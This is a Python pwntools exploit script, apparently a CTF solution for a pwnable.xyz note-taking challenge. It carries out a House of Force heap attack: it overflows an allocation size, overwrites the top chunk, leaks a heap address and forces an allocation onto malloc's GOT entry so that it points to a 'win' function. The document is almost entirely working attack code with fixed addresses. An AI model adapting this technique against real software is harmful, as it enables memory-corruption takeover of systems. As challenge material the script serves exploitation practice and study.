###House of Force

from pwn import *

###Structure
'''
    |   8   |   8   |
0x00|siz|   | title |
0x10|      note     |
           ...
0xn0|      note     |
'''

###Utils
def create(size,title,data,mode='normal'):
    r.sendlineafter('> ','1')
    r.sendlineafter('Size: ',str(size))
    r.sendafter('Title',title)
    if mode=='normal':
        r.sendafter('Note: ',data)

def edit(idx,data):
    r.sendlineafter('> ','2')
    r.sendlineafter('Note: ',str(idx))
    r.sendafter('Data: ',data)

def show():
    r.sendlineafter('> ','3')
    return r.recvuntil('\nMenu',drop=True)

###Addr
malloc_got = 0x601250
win = 0x4008a2

###Exploit
r = remote('svc.pwnable.xyz',30041)
#r = process('./N',env={'LD_PRELOAD':'/home/student/05/b05902008/Workspace/alpine-libc-2.24.so'})
create(0xffffffffffffffff,'M30W','M30W',mode='overflow')
edit(0,b'a'*0x38+p64(0xfb1)+b'a'*0x200)
create(0xfe8,'\x01','M30W',mode='normal')
edit(0,'a'*0x50)
heap = u64(show().split(b'\n')[0].split(b': ')[1][0x50:].ljust(8,b'\x00'))-0x50
print(hex(heap))

###Exhaust chunk(Don't forget double 0x10 fencpost)
create(0xf18,'M30W','M30W',mode='normal')

###House of Force to overwrite malloc hook
create(0xffffffffffffffff,'M30W','M30W',mode='overflow')
edit(3,b'a'*0x38+p64(0xffffffffffffffff))
###heap+... -> top
###0x18->prefix_size+padding
###0x10->chunk_data-chunk_start
create(malloc_got-(heap+0x21000+0x1000+0x20+0x30)-0x18-0x10,p64(win),'M30W',mode='hijack_top')

###Trigger malloc
r.sendlineafter('> ','1')
r.sendlineafter('Size: ','1')

r.interactive()
